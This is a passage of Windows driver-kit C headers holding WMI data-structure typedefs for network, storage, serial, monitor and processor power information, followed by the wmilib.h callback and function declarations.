  ULONG NumberElements;
  UCHAR NdisStatusDot11RoamingStartIndication[1];
} MSNdis_StatusDot11RoamingStart, *PMSNdis_StatusDot11RoamingStart;

typedef struct _MSNdis_StatusDot11RoamingCompletion {
  ULONG NumberElements;
  UCHAR NdisStatusDot11RoamingCompletionIndication[1];
} MSNdis_StatusDot11RoamingCompletion, *PMSNdis_StatusDot11RoamingCompletion;

typedef struct _MSNdis_StatusDot11Disassociation {
  ULONG NumberElements;
  UCHAR NdisStatusDot11DisassociationIndication[1];
} MSNdis_StatusDot11Disassociation, *PMSNdis_StatusDot11Disassociation;

typedef struct _MSNdis_StatusDot11TkipmicFailure {
  ULONG NumberElements;
  UCHAR NdisStatusDot11TkipmicFailureIndication[1];
} MSNdis_StatusDot11TkipmicFailure, *PMSNdis_StatusDot11TkipmicFailure;

typedef struct _MSNdis_StatusDot11PmkidCandidateList {
  ULONG NumberElements;
  UCHAR NdisStatusDot11PmkidCandidateListIndication[1];
} MSNdis_StatusDot11PmkidCandidateList, *PMSNdis_StatusDot11PmkidCandidateList;

typedef struct _MSNdis_StatusDot11PhyStateChange {
  ULONG NumberElements;
  UCHAR NdisStatusDot11PhyStateChangeIndication[1];
} MSNdis_StatusDot11PhyStateChange, *PMSNdis_StatusDot11PhyStateChange;

typedef struct _MSNdis_StatusDot11LinkQuality {
  ULONG NumberElements;
  UCHAR NdisStatusDot11LinkQualityIndication[1];
} MSNdis_StatusDot11LinkQuality, *PMSNdis_StatusDot11LinkQuality;

typedef struct _KEYBOARD_PORT_WMI_STD_DATA {
  ULONG ConnectorType;
  ULONG DataQueueSize;
  ULONG ErrorCount;
  ULONG FunctionKeys;
  ULONG Indicators;
} KEYBOARD_PORT_WMI_STD_DATA, *PKEYBOARD_PORT_WMI_STD_DATA;

typedef struct _KEYBOARD_ID_EX {
  ULONG Type;
  ULONG Subtype;
} KEYBOARD_ID_EX, *PKEYBOARD_ID_EX;

typedef struct _POINTER_PORT_WMI_STD_DATA {
  ULONG ConnectorType;
  ULONG DataQueueSize;
  ULONG ErrorCount;
  ULONG Buttons;
  ULONG HardwareType;
} POINTER_PORT_WMI_STD_DATA, *PPOINTER_PORT_WMI_STD_DATA;

typedef struct _MSMouse_ClassInformation {
  ULONGLONG DeviceId;
} MSMouse_ClassInformation, *PMSMouse_ClassInformation;

typedef struct _MSKeyboard_ClassInformation {
  ULONGLONG DeviceId;
} MSKeyboard_ClassInformation, *PMSKeyboard_ClassInformation;

typedef struct _AGP_STD_DATA {
  ULONGLONG ApertureBase;
  ULONG ApertureLength;
  ULONG AgpStatus;
  ULONG AgpCommand;
} AGP_STD_DATA, *PAGP_STD_DATA;

typedef struct _MSAcpi_ThermalZoneTemperature {
  ULONG ThermalStamp;
  ULONG ThermalConstant1;
  ULONG ThermalConstant2;
  ULONG Reserved;
  ULONG SamplingPeriod;
  ULONG CurrentTemperature;
  ULONG PassiveTripPoint;
  ULONG CriticalTripPoint;
  ULONG ActiveTripPointCount;
  ULONG ActiveTripPoint[10];
} MSAcpi_ThermalZoneTemperature, *PMSAcpi_ThermalZoneTemperature;

typedef struct _WMI_DISK_GEOMETRY {
  LONGLONG Cylinders;
  ULONG MediaType;
  ULONG TracksPerCylinder;
  ULONG SectorsPerTrack;
  ULONG BytesPerSector;
} WMI_DISK_GEOMETRY, *PWMI_DISK_GEOMETRY;

typedef struct _WMI_DISK_PERFORMANCE {
  LONGLONG BytesRead;
  LONGLONG BytesWritten;
  LONGLONG ReadTime;
  LONGLONG WriteTime;
  LONGLONG IdleTime;
  ULONG ReadCount;
  ULONG WriteCount;
  ULONG QueueDepth;
  ULONG SplitCount;
  LONGLONG QueryTime;
  ULONG StorageDeviceNumber;
  USHORT StorageManagerName[8];
} WMI_DISK_PERFORMANCE, *PWMI_DISK_PERFORMANCE;

typedef struct _MSDiskDriver_Performance {
  WMI_DISK_PERFORMANCE PerfData;
  CHAR VariableData[1];
} MSDiskDriver_Performance, *PMSDiskDriver_Performance;

typedef struct _STORAGE_FAILURE_PREDICT_STATUS {
  ULONG Reason;
  BOOLEAN PredictFailure;
} STORAGE_FAILURE_PREDICT_STATUS, *PSTORAGE_FAILURE_PREDICT_STATUS;

typedef struct _STORAGE_FAILURE_PREDICT_DATA {
  ULONG Length;
  UCHAR VendorSpecific[512];
} STORAGE_FAILURE_PREDICT_DATA, *PSTORAGE_FAILURE_PREDICT_DATA;

typedef struct _ATAPI_FAILURE_PREDICT_DATA {
  ULONG Length;
  UCHAR VendorSpecific[362];
  UCHAR OfflineCollectionStatus;
  UCHAR SelfTestStatus;
  USHORT TotalTime;
  UCHAR VendorSpecific2;
  UCHAR OfflineCollectCapability;
  USHORT SmartCapability;
  UCHAR ErrorLogCapability;
  UCHAR VendorSpecific3;
  UCHAR ShortPollTimeInMinutes;
  UCHAR ExtendedPollTimeInMinutes;
  UCHAR Reserved[12];
  UCHAR VendorSpecific4[125];
  UCHAR Checksum;
} ATAPI_FAILURE_PREDICT_DATA, *PATAPI_FAILURE_PREDICT_DATA;

typedef struct _STORAGE_FAILURE_PREDICT_THRESHOLDS {
  UCHAR VendorSpecific[512];
} STORAGE_FAILURE_PREDICT_THRESHOLDS, *PSTORAGE_FAILURE_PREDICT_THRESHOLDS;

typedef struct _STORAGE_FAILURE_PREDICT_EVENT {
  ULONG Length;
  UCHAR VendorSpecific[1];
} STORAGE_FAILURE_PREDICT_EVENT, *PSTORAGE_FAILURE_PREDICT_EVENT;

typedef struct _ALLOW_PERFORMANCE_HIT_IN {
  BOOLEAN Allow;
} ALLOW_PERFORMANCE_HIT_IN, *PALLOW_PERFORMANCE_HIT_IN;

typedef struct _ENABLE_DISABLE_FP_IN {
  BOOLEAN Enable;
} ENABLE_DISABLE_FP_IN, *PENABLE_DISABLE_FP_IN;

typedef struct _ENABLE_DISABLE_FP_POLLING_IN {
  ULONG Period;
  BOOLEAN Enable;
} ENABLE_DISABLE_FP_POLLING_IN, *PENABLE_DISABLE_FP_POLLING_IN;

typedef struct _GET_FP_CAPABILITY_OUT {
  ULONG Capability;
} GET_FP_CAPABILITY_OUT, *PGET_FP_CAPABILITY_OUT;

typedef struct _ENABLE_OFFLINE_DIAGS_OUT {
  BOOLEAN Success;
} ENABLE_OFFLINE_DIAGS_OUT, *PENABLE_OFFLINE_DIAGS_OUT;

typedef struct _READ_LOG_SECTORS_IN {
  UCHAR LogAddress;
  UCHAR SectorCount;
} READ_LOG_SECTORS_IN, *PREAD_LOG_SECTORS_IN;

typedef struct _READ_LOG_SECTORS_OUT {
  ULONG Length;
  UCHAR LogSectors[1];
} READ_LOG_SECTORS_OUT, *PREAD_LOG_SECTORS_OUT;

typedef struct _WRITE_LOG_SECTORS_IN {
  UCHAR LogAddress;
  UCHAR SectorCount;
  ULONG Length;
  UCHAR LogSectors[1];
} WRITE_LOG_SECTORS_IN, *PWRITE_LOG_SECTORS_IN;

typedef struct _WRITE_LOG_SECTORS_OUT {
  BOOLEAN Success;
} WRITE_LOG_SECTORS_OUT, *PWRITE_LOG_SECTORS_OUT;

typedef struct _EXECUTE_SELF_TEST_IN {
  UCHAR Subcommand;
} EXECUTE_SELF_TEST_IN, *PEXECUTE_SELF_TEST_IN;

typedef struct _EXECUTE_SELF_TEST_OUT {
  ULONG ReturnCode;
} EXECUTE_SELF_TEST_OUT, *PEXECUTE_SELF_TEST_OUT;

typedef struct _STORAGE_SCSI_INFO_EXCEPTIONS {
  BOOLEAN PageSavable;
  UCHAR Flags;
  UCHAR MRIE;
  UCHAR Padding;
  ULONG IntervalTimer;
  ULONG ReportCount;
} STORAGE_SCSI_INFO_EXCEPTIONS, *PSTORAGE_SCSI_INFO_EXCEPTIONS;

typedef struct _MSIde_PortDeviceInfo {
  UCHAR Bus;
  UCHAR Target;
  UCHAR Lun;
} MSIde_PortDeviceInfo, *PMSIde_PortDeviceInfo;

typedef struct _MSSerial_PortName {
  CHAR VariableData[1];
} MSSerial_PortName, *PMSSerial_PortName;

typedef struct _SERIAL_WMI_COMM_DATA {
  ULONG BaudRate;
  ULONG BitsPerByte;
  ULONG Parity;
  BOOLEAN ParityCheckEnable;
  ULONG StopBits;
  ULONG XoffCharacter;
  ULONG XoffXmitThreshold;
  ULONG XonCharacter;
  ULONG XonXmitThreshold;
  ULONG MaximumBaudRate;
  ULONG MaximumOutputBufferSize;
  ULONG MaximumInputBufferSize;
  BOOLEAN Support16BitMode;
  BOOLEAN SupportDTRDSR;
  BOOLEAN SupportIntervalTimeouts;
  BOOLEAN SupportParityCheck;
  BOOLEAN SupportRTSCTS;
  BOOLEAN SupportXonXoff;
  BOOLEAN SettableBaudRate;
  BOOLEAN SettableDataBits;
  BOOLEAN SettableFlowControl;
  BOOLEAN SettableParity;
  BOOLEAN SettableParityCheck;
  BOOLEAN SettableStopBits;
  BOOLEAN IsBusy;
} SERIAL_WMI_COMM_DATA, *PSERIAL_WMI_COMM_DATA;

typedef struct _SERIAL_WMI_HW_DATA {
  ULONG IrqNumber;
  ULONG IrqVector;
  ULONG IrqLevel;
  ULONGLONG IrqAffinityMask;
  ULONG InterruptType;
  ULONGLONG BaseIOAddress;
} SERIAL_WMI_HW_DATA, *PSERIAL_WMI_HW_DATA;

typedef struct _SERIAL_WMI_PERF_DATA {
  ULONG ReceivedCount;
  ULONG TransmittedCount;
  ULONG FrameErrorCount;
  ULONG SerialOverrunErrorCount;
  ULONG BufferOverrunErrorCount;
  ULONG ParityErrorCount;
} SERIAL_WMI_PERF_DATA, *PSERIAL_WMI_PERF_DATA;

typedef struct _SERIAL_WMI_COMMPROP {
  USHORT wPacketLength;
  USHORT wPacketVersion;
  ULONG dwServiceMask;
  ULONG dwReserved1;
  ULONG dwMaxTxQueue;
  ULONG dwMaxRxQueue;
  ULONG dwMaxBaud;
  ULONG dwProvSubType;
  ULONG dwProvCapabilities;
  ULONG dwSettableParams;
  ULONG dwSettableBaud;
  USHORT wSettableData;
  USHORT wSettableStopParity;
  ULONG dwCurrentTxQueue;
  ULONG dwCurrentRxQueue;
  ULONG dwProvSpec1;
  ULONG dwProvSpec2;
  ULONG dwProvCharSize;
  UCHAR wcProvChar[1];
} SERIAL_WMI_COMMPROP, *PSERIAL_WMI_COMMPROP;

typedef struct _PARPORT_WMI_ALLOC_FREE_COUNTS {
  ULONG PortAllocates;
  ULONG PortFrees;
} PARPORT_WMI_ALLOC_FREE_COUNTS, *PPARPORT_WMI_ALLOC_FREE_COUNTS;

typedef struct _PARALLEL_WMI_LOG_INFO {
  ULONG Flags1;
  ULONG Flags2;
  ULONG spare[2];
  LONGLONG SppWriteCount;
  LONGLONG NibbleReadCount;
  LONGLONG BoundedEcpWriteCount;
  LONGLONG BoundedEcpReadCount;
  LONGLONG HwEcpWriteCount;
  LONGLONG HwEcpReadCount;
  LONGLONG SwEcpWriteCount;
  LONGLONG SwEcpReadCount;
  LONGLONG HwEppWriteCount;
  LONGLONG HwEppReadCount;
  LONGLONG SwEppWriteCount;
  LONGLONG SwEppReadCount;
  LONGLONG ByteReadCount;
  LONGLONG ChannelNibbleReadCount;
} PARALLEL_WMI_LOG_INFO, *PPARALLEL_WMI_LOG_INFO;

typedef struct _REDBOOK_WMI_STD_DATA {
  ULONG NumberOfBuffers;
  ULONG SectorsPerRead;
  ULONG SectorsPerReadMask;
  ULONG MaximumSectorsPerRead;
  BOOLEAN PlayEnabled;
  BOOLEAN CDDASupported;
  BOOLEAN CDDAAccurate;
  BOOLEAN Reserved1;
} REDBOOK_WMI_STD_DATA, *PREDBOOK_WMI_STD_DATA;

typedef struct _REDBOOK_WMI_PERF_DATA {
  LONGLONG TimeReadDelay;
  LONGLONG TimeReading;
  LONGLONG TimeStreamDelay;
  LONGLONG TimeStreaming;
  LONGLONG DataProcessed;
  ULONG StreamPausedCount;
} REDBOOK_WMI_PERF_DATA, *PREDBOOK_WMI_PERF_DATA;

typedef struct _RegisteredGuids {
  ULONG GuidType;
  ULONG LoggerId;
  ULONG EnableLevel;
  ULONG EnableFlags;
  BOOLEAN IsEnabled;
} RegisteredGuids, *PRegisteredGuids;

typedef struct _WMI_TAPE_DRIVE_PARAMETERS {
  ULONG MaximumBlockSize;
  ULONG MinimumBlockSize;
  ULONG DefaultBlockSize;
  ULONG MaximumPartitionCount;
  BOOLEAN CompressionCapable;
  BOOLEAN CompressionEnabled;
  BOOLEAN ReportSetmarks;
  BOOLEAN HardwareErrorCorrection;
} WMI_TAPE_DRIVE_PARAMETERS, *PWMI_TAPE_DRIVE_PARAMETERS;

typedef struct _WMI_TAPE_MEDIA_PARAMETERS {
  ULONGLONG MaximumCapacity;
  ULONGLONG AvailableCapacity;
  ULONG BlockSize;
  ULONG PartitionCount;
  BOOLEAN MediaWriteProtected;
} WMI_TAPE_MEDIA_PARAMETERS, *PWMI_TAPE_MEDIA_PARAMETERS;

typedef struct _WMI_TAPE_SYMBOLIC_NAME {
  CHAR VariableData[1];
} WMI_TAPE_SYMBOLIC_NAME, *PWMI_TAPE_SYMBOLIC_NAME;

typedef struct _WMI_TAPE_PROBLEM_WARNING {
  ULONG DriveProblemType;
  UCHAR TapeData[512];
} WMI_TAPE_PROBLEM_WARNING, *PWMI_TAPE_PROBLEM_WARNING;

typedef struct _WMI_TAPE_PROBLEM_IO_ERROR {
  ULONG ReadCorrectedWithoutDelay;
  ULONG ReadCorrectedWithDelay;
  ULONG ReadTotalErrors;
  ULONG ReadTotalCorrectedErrors;
  ULONG ReadTotalUncorrectedErrors;
  ULONG ReadCorrectionAlgorithmProcessed;
  ULONG WriteCorrectedWithoutDelay;
  ULONG WriteCorrectedWithDelay;
  ULONG WriteTotalErrors;
  ULONG WriteTotalCorrectedErrors;
  ULONG WriteTotalUncorrectedErrors;
  ULONG WriteCorrectionAlgorithmProcessed;
  ULONG NonMediumErrors;
} WMI_TAPE_PROBLEM_IO_ERROR, *PWMI_TAPE_PROBLEM_IO_ERROR;

typedef struct _WMI_TAPE_PROBLEM_DEVICE_ERROR {
  BOOLEAN ReadWarning;
  BOOLEAN WriteWarning;
  BOOLEAN HardError;
  BOOLEAN ReadFailure;
  BOOLEAN WriteFailure;
  BOOLEAN UnsupportedFormat;
  BOOLEAN TapeSnapped;
  BOOLEAN DriveRequiresCleaning;
  BOOLEAN TimetoCleanDrive;
  BOOLEAN DriveHardwareError;
  BOOLEAN ScsiInterfaceError;
  BOOLEAN MediaLife;
} WMI_TAPE_PROBLEM_DEVICE_ERROR, *PWMI_TAPE_PROBLEM_DEVICE_ERROR;

typedef struct _WMI_CHANGER_PARAMETERS {
  ULONG NumberOfSlots;
  ULONG NumberOfDrives;
  ULONG NumberOfIEPorts;
  ULONG NumberOfTransports;
  ULONG NumberOfDoors;
  ULONG NumberOfCleanerSlots;
  ULONG MagazineSize;
} WMI_CHANGER_PARAMETERS, *PWMI_CHANGER_PARAMETERS;

typedef struct _WMI_CHANGER_PROBLEM_WARNING {
  ULONG ChangerProblemType;
  UCHAR ChangerData[512];
} WMI_CHANGER_PROBLEM_WARNING, *PWMI_CHANGER_PROBLEM_WARNING;

typedef struct _WMI_CHANGER_PROBLEM_DEVICE_ERROR {
  ULONG ChangerProblemType;
} WMI_CHANGER_PROBLEM_DEVICE_ERROR, *PWMI_CHANGER_PROBLEM_DEVICE_ERROR;

typedef struct _DEVICE_UI_FIRMWARE_REVISION {
  CHAR VariableData[1];
} DEVICE_UI_FIRMWARE_REVISION, *PDEVICE_UI_FIRMWARE_REVISION;

typedef struct _MSVerifierIrpLogEntry {
  ULONG Count;
  UCHAR Major;
  UCHAR Minor;
  UCHAR Flags;
  UCHAR Control;
  ULONGLONG Arg1;
  ULONGLONG Arg2;
  ULONGLONG Arg3;
  ULONGLONG Arg4;
} MSVerifierIrpLogEntry, *PMSVerifierIrpLogEntry;

typedef struct _MSVerifierIrpLogInformation {
  ULONG DeviceType;
  ULONG EntryCount;
  MSVerifierIrpLogEntry Entries[1];
} MSVerifierIrpLogInformation, *PMSVerifierIrpLogInformation;

typedef struct _WmiMonitorBrightness {
  UCHAR CurrentBrightness;
  ULONG Levels;
  UCHAR Level[1];
} WmiMonitorBrightness, *PWmiMonitorBrightness;

typedef struct _WmiSetBrightness_IN {
  ULONG Timeout;
  UCHAR Brightness;
} WmiSetBrightness_IN, *PWmiSetBrightness_IN;

typedef struct _WmiSetALSBrightnessState_IN {
  BOOLEAN State;
} WmiSetALSBrightnessState_IN, *PWmiSetALSBrightnessState_IN;

typedef struct _WmiSetALSBrightness_IN {
  UCHAR Brightness;
} WmiSetALSBrightness_IN, *PWmiSetALSBrightness_IN;

typedef struct _WmiMonitorBrightnessEvent {
  UCHAR Brightness;
} WmiMonitorBrightnessEvent, *PWmiMonitorBrightnessEvent;

typedef struct _WmiMonitorRawEEdidV1Block {
  UCHAR Id;
  UCHAR Type;
  UCHAR Content[128];
} WmiMonitorRawEEdidV1Block, *PWmiMonitorRawEEdidV1Block;

typedef struct _WmiGetMonitorRawEEdidV1Block_IN {
  UCHAR BlockId;
} WmiGetMonitorRawEEdidV1Block_IN, *PWmiGetMonitorRawEEdidV1Block_IN;

typedef struct _WmiGetMonitorRawEEdidV1Block_OUT {
  UCHAR BlockType;
  UCHAR BlockContent[128];
} WmiGetMonitorRawEEdidV1Block_OUT, *PWmiGetMonitorRawEEdidV1Block_OUT;

typedef struct _WmiMonitorID {
  USHORT ProductCodeID[16];
  USHORT SerialNumberID[16];
  USHORT ManufacturerName[16];
  UCHAR WeekOfManufacture;
  USHORT YearOfManufacture;
  USHORT UserFriendlyNameLength;
  USHORT UserFriendlyName[1];
} WmiMonitorID, *PWmiMonitorID;

typedef struct _WmiMonitorSupportedDisplayFeatures {
  BOOLEAN StandbySupported;
  BOOLEAN SuspendSupported;
  BOOLEAN ActiveOffSupported;
  UCHAR DisplayType;
  BOOLEAN sRGBSupported;
  BOOLEAN HasPreferredTimingMode;
  BOOLEAN GTFSupported;
} WmiMonitorSupportedDisplayFeatures, *PWmiMonitorSupportedDisplayFeatures;

typedef struct _WmiMonitorBasicDisplayParams {
  UCHAR VideoInputType;
  UCHAR MaxHorizontalImageSize;
  UCHAR MaxVerticalImageSize;
  UCHAR DisplayTransferCharacteristic;
  WmiMonitorSupportedDisplayFeatures SupportedDisplayFeatures;
} WmiMonitorBasicDisplayParams, *PWmiMonitorBasicDisplayParams;

typedef struct _WmiMonitorConnectionParams {
  ULONG VideoOutputTechnology;
} WmiMonitorConnectionParams, *PWmiMonitorConnectionParams;

typedef struct _WmiMonitorAnalogVideoInputParams {
  UCHAR SignalLevelStandard;
  UCHAR SetupExpected;
  UCHAR SeparateSyncsSupported;
  UCHAR CompositeSyncSupported;
  UCHAR SyncOnGreenVideoSupported;
  UCHAR SerrationOfVsyncRequired;
} WmiMonitorAnalogVideoInputParams, *PWmiMonitorAnalogVideoInputParams;

typedef struct _WmiMonitorDigitalVideoInputParams {
  BOOLEAN IsDFP1xCompatible;
} WmiMonitorDigitalVideoInputParams, *PWmiMonitorDigitalVideoInputParams;

typedef struct _WmiMonitorColorXYZinCIE {
  USHORT X;
  USHORT Y;
} WmiMonitorColorXYZinCIE, *PWmiMonitorColorXYZinCIE;

typedef struct _WmiMonitorColorCharacteristics {
  WmiMonitorColorXYZinCIE Red;
  WmiMonitorColorXYZinCIE Blue;
  WmiMonitorColorXYZinCIE Green;
  WmiMonitorColorXYZinCIE DefaultWhite;
} WmiMonitorColorCharacteristics, *PWmiMonitorColorCharacteristics;

typedef struct _VideoModeDescriptor {
  ULONG PixelClockRate;
  ULONG VerticalRefreshRateNumerator;
  ULONG VerticalRefreshRateDenominator;
  ULONG HorizontalRefreshRateNumerator;
  ULONG HorizontalRefreshRateDenominator;
  USHORT HorizontalActivePixels;
  USHORT VerticalActivePixels;
  USHORT HorizontalBlankingPixels;
  USHORT VerticalBlankingPixels;
  USHORT HorizontalSyncOffset;
  USHORT VerticalSyncOffset;
  USHORT HorizontalSyncPulseWidth;
  USHORT VerticalSyncPulseWidth;
  USHORT HorizontalImageSize;
  USHORT VerticalImageSize;
  USHORT HorizontalBorder;
  USHORT VerticalBorder;
  BOOLEAN IsInterlaced;
  UCHAR StereoModeType;
  UCHAR SyncSignalType;
  UCHAR IsSerrationRequired;
  UCHAR IsSyncOnRGB;
  UCHAR CompositePolarityType;
  UCHAR VerticalPolarityType;
  UCHAR HorizontalPolarityType;
  UCHAR VideoStandardType;
  UCHAR Origin;
  UCHAR TimingType;
} VideoModeDescriptor, *PVideoModeDescriptor;

typedef struct _WmiMonitorListedSupportedSourceModes {
  USHORT NumOfMonitorSourceModes;
  USHORT PreferredMonitorSourceModeIndex;
  VideoModeDescriptor MonitorSourceModes[1];
} WmiMonitorListedSupportedSourceModes, *PWmiMonitorListedSupportedSourceModes;

typedef struct _FrequencyRangeDescriptor {
  UCHAR Origin;
  ULONG MinVSyncNumerator;
  ULONG MinVSyncDenominator;
  ULONG MaxVSyncNumerator;
  ULONG MaxVSyncDenominator;
  ULONG MinHSyncNumerator;
  ULONG MinHSyncDenominator;
  ULONG MaxHSyncNumerator;
  ULONG MaxHSyncDenominator;
  ULONG ConstraintType;
  ULONG ActiveWidth;
  ULONG ActiveHeight;
  ULONG MaxPixelRate;
} FrequencyRangeDescriptor, *PFrequencyRangeDescriptor;

typedef struct _WmiMonitorListedFrequencyRanges {
  USHORT NumOfMonitorFreqRanges;
  FrequencyRangeDescriptor MonitorFreqRanges[1];
} WmiMonitorListedFrequencyRanges, *PWmiMonitorListedFrequencyRanges;

typedef struct _KernelPerfState {
  ULONG Frequency;
  ULONG Power;
  UCHAR PercentFrequency;
  UCHAR IncreaseLevel;
  UCHAR DecreaseLevel;
  UCHAR Type;
  ULONG IncreaseTime;
  ULONG DecreaseTime;
  ULONGLONG Control;
  ULONGLONG Status;
  ULONG HitCount;
  ULONG Reserved1;
  ULONGLONG Reserved2;
  ULONGLONG Reserved3;
} KernelPerfState, *PKernelPerfState;

typedef struct _KernelPerfStates {
  ULONG Count;
  ULONG MaxFrequency;
  ULONG CurrentState;
  ULONG MaxPerfState;
  ULONG MinPerfState;
  ULONG LowestPerfState;
  ULONG ThermalConstraint;
  UCHAR BusyAdjThreshold;
  UCHAR PolicyType;
  UCHAR Type;
  UCHAR Reserved;
  ULONG TimerInterval;
  ULONGLONG TargetProcessors;
  ULONG PStateHandler;
  ULONG PStateContext;
  ULONG TStateHandler;
  ULONG TStateContext;
  ULONG FeedbackHandler;
  ULONG Reserved1;
  ULONGLONG Reserved2;
  KernelPerfState State[1];
} KernelPerfStates, *PKernelPerfStates;

typedef struct _KernelIdleState {
  ULONG Latency;
  ULONG Power;
  ULONG TimeCheck;
  UCHAR PromotePercent;
  UCHAR DemotePercent;
  UCHAR StateType;
  UCHAR Reserved;
  ULONG StateFlags;
  ULONG Context;
  ULONG IdleHandler;
  ULONG Reserved1;
} KernelIdleState, *PKernelIdleState;

typedef struct _KernelIdleStates {
  ULONG Type;
  ULONG Count;
  ULONG TargetState;
  ULONG OldState;
  ULONGLONG TargetProcessors;
  KernelIdleState State[1];
} KernelIdleStates, *PKernelIdleStates;

typedef struct _KernelPerfStateChange {
  ULONG State;
  ULONG Status;
  ULONG Latency;
  ULONG Speed;
  ULONG Processor;
} KernelPerfStateChange, *PKernelPerfStateChange;

typedef struct _KernelPerfStateDomainChange {
  ULONG State;
  ULONG Latency;
  ULONG Speed;
  ULONGLONG Processors;
} KernelPerfStateDomainChange, *PKernelPerfStateDomainChange;

typedef struct _KernelIdleStateChange {
  ULONG NewState;
  ULONG OldState;
  ULONGLONG Processors;
} KernelIdleStateChange, *PKernelIdleStateChange;

typedef struct _KernelThermalConstraintChange {
  ULONG ThermalConstraint;
  ULONGLONG Processors;
} KernelThermalConstraintChange, *PKernelThermalConstraintChange;

typedef struct _IdleStateAccounting {
  ULONG IdleTransitions;
  ULONG FailedTransitions;
  ULONG InvalidBucketIndex;
  ULONGLONG TotalTime;
  ULONG IdleTimeBuckets[6];
} IdleStateAccounting, *PIdleStateAccounting;

typedef struct _IdleAccounting {
  ULONG StateCount;
  ULONG TotalTransitions;
  ULONG ResetCount;
  ULONGLONG StartTime;
  IdleStateAccounting State[1];
} IdleAccounting, *PIdleAccounting;

typedef struct _IdleStateBucketEx {
  ULONGLONG TotalTimeUs;
  ULONG MinTimeUs;
  ULONG MaxTimeUs;
  ULONG Count;
} IdleStateBucketEx, *PIdleStateBucketEx;

typedef struct _IdleStateAccountingEx {
  ULONGLONG TotalTime;
  ULONG IdleTransitions;
  ULONG FailedTransitions;
  ULONG InvalidBucketIndex;
  ULONG MinTimeUs;
  ULONG MaxTimeUs;
  IdleStateBucketEx IdleTimeBuckets[16];
} IdleStateAccountingEx, *PIdleStateAccountingEx;

typedef struct _IdleAccountingEx {
  ULONG StateCount;
  ULONG TotalTransitions;
  ULONG ResetCount;
  ULONGLONG StartTime;
  IdleStateAccountingEx State[1];
} IdleAccountingEx, *PIdleAccountingEx;

typedef struct _KernelThermalPolicyChange {
  UCHAR CoolingMode;
  ULONGLONG Processors;
} KernelThermalPolicyChange, *PKernelThermalPolicyChange;

typedef struct _ProcessorPerformance {
  ULONG frequency;
  ULONG power;
  ULONG percentage;
} ProcessorPerformance, *PProcessorPerformance;

```

`include/ddk/wmilib.h`:

```h
#pragma once

#ifdef __cplusplus
extern "C" {
#endif

typedef enum _WMIENABLEDISABLECONTROL {
  WmiEventControl,
  WmiDataBlockControl
} WMIENABLEDISABLECONTROL, *PWMIENABLEDISABLECONTROL;

typedef enum _SYSCTL_IRP_DISPOSITION {
  IrpProcessed,
  IrpNotCompleted,
  IrpNotWmi,
  IrpForward
} SYSCTL_IRP_DISPOSITION, *PSYSCTL_IRP_DISPOSITION;

typedef struct _WMIGUIDREGINFO {
  LPCGUID Guid;
  ULONG InstanceCount;
  ULONG Flags;
} WMIGUIDREGINFO, *PWMIGUIDREGINFO;

typedef NTSTATUS
(NTAPI WMI_QUERY_REGINFO_CALLBACK) (
  IN OUT PDEVICE_OBJECT DeviceObject,
  IN OUT PULONG RegFlags,
  IN OUT PUNICODE_STRING InstanceName,
  OUT PUNICODE_STRING *RegistryPath OPTIONAL,
  IN OUT PUNICODE_STRING MofResourceName,
  OUT PDEVICE_OBJECT *Pdo OPTIONAL);
typedef WMI_QUERY_REGINFO_CALLBACK *PWMI_QUERY_REGINFO;

typedef NTSTATUS
(NTAPI WMI_FUNCTION_CONTROL_CALLBACK) (
  IN OUT PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  IN ULONG GuidIndex,
  IN WMIENABLEDISABLECONTROL Function,
  IN BOOLEAN Enable);
typedef WMI_FUNCTION_CONTROL_CALLBACK *PWMI_FUNCTION_CONTROL;

typedef NTSTATUS
(NTAPI WMI_QUERY_DATABLOCK_CALLBACK) (
  IN OUT PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  IN ULONG GuidIndex,
  IN ULONG InstanceIndex,
  IN ULONG InstanceCount,
  OUT PULONG InstanceLengthArray OPTIONAL,
  IN ULONG BufferAvail,
  OUT PUCHAR Buffer OPTIONAL);
typedef WMI_QUERY_DATABLOCK_CALLBACK *PWMI_QUERY_DATABLOCK;

typedef NTSTATUS
(NTAPI WMI_EXECUTE_METHOD_CALLBACK) (
  IN OUT PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  IN ULONG GuidIndex,
  IN ULONG InstanceIndex,
  IN ULONG MethodId,
  IN ULONG InBufferSize,
  IN ULONG OutBufferSize,
  IN OUT PUCHAR Buffer);
typedef WMI_EXECUTE_METHOD_CALLBACK *PWMI_EXECUTE_METHOD;

typedef NTSTATUS
(NTAPI WMI_SET_DATABLOCK_CALLBACK) (
  IN OUT PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  IN ULONG GuidIndex,
  IN ULONG InstanceIndex,
  IN ULONG BufferSize,
  IN PUCHAR Buffer);
typedef WMI_SET_DATABLOCK_CALLBACK *PWMI_SET_DATABLOCK;

typedef NTSTATUS
(NTAPI WMI_SET_DATAITEM_CALLBACK) (
  IN OUT PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  IN ULONG GuidIndex,
  IN ULONG InstanceIndex,
  IN ULONG DataItemId,
  IN ULONG BufferSize,
  IN PUCHAR Buffer);
typedef WMI_SET_DATAITEM_CALLBACK *PWMI_SET_DATAITEM;

typedef struct _WMILIB_CONTEXT {
  ULONG GuidCount;
  PWMIGUIDREGINFO GuidList;
  PWMI_QUERY_REGINFO QueryWmiRegInfo;
  PWMI_QUERY_DATABLOCK QueryWmiDataBlock;
  PWMI_SET_DATABLOCK SetWmiDataBlock;
  PWMI_SET_DATAITEM SetWmiDataItem;
  PWMI_EXECUTE_METHOD ExecuteWmiMethod;
  PWMI_FUNCTION_CONTROL WmiFunctionControl;
} WMILIB_CONTEXT, *PWMILIB_CONTEXT;

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSTATUS
NTAPI
WmiCompleteRequest(
  IN PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  IN NTSTATUS Status,
  IN ULONG BufferUsed,
  IN CCHAR PriorityBoost);

NTSTATUS
NTAPI
WmiSystemControl(
  IN PWMILIB_CONTEXT WmiLibInfo,
  IN PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp,
  OUT PSYSCTL_IRP_DISPOSITION IrpDisposition);

NTSTATUS
NTAPI
WmiFireEvent(
  IN PDEVICE_OBJECT DeviceObject,
  IN LPCGUID Guid,
  IN ULONG InstanceIndex,
  IN ULONG EventDataSize,
  IN PVOID EventData);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#ifdef __cplusplus
}
#endif

```

`include/ddk/ws2san.h`:

```h
/*
 * ws2san.h
 *
